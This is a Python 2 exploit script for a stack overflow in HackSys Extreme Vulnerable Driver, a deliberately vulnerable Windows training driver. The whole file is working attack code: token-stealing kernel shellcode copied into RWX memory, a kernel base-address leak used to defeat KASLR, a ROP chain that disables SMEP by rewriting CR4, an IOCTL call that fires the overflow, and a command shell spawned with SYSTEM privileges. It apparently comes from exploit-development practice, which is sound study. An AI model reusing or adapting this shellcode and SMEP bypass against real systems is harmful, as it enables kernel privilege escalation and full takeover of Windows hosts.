import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi


payload = bytearray(
    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
    "\x48\x8B\x80\xB8\x00\x00\x00"                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
    "\x48\x89\xC3"                                      # mov rbx,rax         ; Copy current process to rbx
    "\x48\x8B\x9B\xE8\x02\x00\x00"                      # mov rbx,[rbx+0x2e8] ; ActiveProcessLinks
    "\x48\x81\xEB\xE8\x02\x00\x00"                      # sub rbx,0x2e8       ; Go back to current process
    "\x48\x8B\x8B\xE0\x02\x00\x00"                      # mov rcx,[rbx+0x2e0] ; UniqueProcessId (PID)
    "\x48\x83\xF9\x04"                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
    "\x75\xE5"                                          # jnz 0x13            ; Loop until SYSTEM PID is found
    "\x48\x8B\x8B\x58\x03\x00\x00"                      # mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x348
    "\x80\xE1\xF0"                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
    "\x48\x89\x88\x58\x03\x00\x00"                      # mov [rax+0x358],rcx ; Copy SYSTEM token to current process
    "\x48\x83\xC4\x40"                                  # add rsp, 0x40       ; RESTORE (Specific to HEVD)
    "\xC3"                                              # ret                 ; Done!
)

# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying our shellcode in that region.
# We also need to bypass SMEP before calling this shellcode
print "[+] Allocating RWX region for shellcode"
ptr = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(payload)),              # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

# Creates a ctype variant of the payload (from_buffer)
c_type_buffer = (c_char * len(payload)).from_buffer(payload)

print "[+] Copying shellcode to newly allocated RWX region"
kernel32.RtlMoveMemory(
    c_int(ptr),                       # Destination (pointer)
    c_type_buffer,                    # Source (pointer)
    c_int(len(payload))               # Length
)

# Need kernel leak to bypass KASLR
# Using Windows API to enumerate base addresses
# We need kernel mode ROP gadgets

# c_ulonglong because of x64 size (unsigned __int64)
base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."

get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# The first entry in the array with device drivers is ntoskrnl base address
kernel_address = base[0]

print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

# Offset to ret overwrite
input_buffer = ("\x41" * 2056)

# SMEP says goodbye
print "[+] Starting ROP chain. Goodbye SMEP..."
input_buffer += struct.pack('<Q', kernel_address + 0x3544)      # pop rcx; ret

print "[+] Flipped SMEP bit to 0 in RCX..."
input_buffer += struct.pack('<Q', 0x506f8)           		        # Intended CR4 value

print "[+] Placed disabled SMEP value in CR4..."
input_buffer += struct.pack('<Q', kernel_address + 0x108552)    # mov cr4, rcx ; ret

print "[+] SMEP disabled!"
input_buffer += struct.pack('<Q', ptr)                          # Location of user mode shellcode

input_buffer_length = len(input_buffer)

# 0x222003 = IOCTL code that will jump to TriggerStackOverflow() function
# Getting handle to driver to return to DeviceIoControl() function
print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
print "[+] Interacting with the driver..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x222003,                           # dwIoControlCode
    input_buffer,                       # lpInBuffer
    input_buffer_length,                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

os.system("cmd.exe /k cd C:\\")
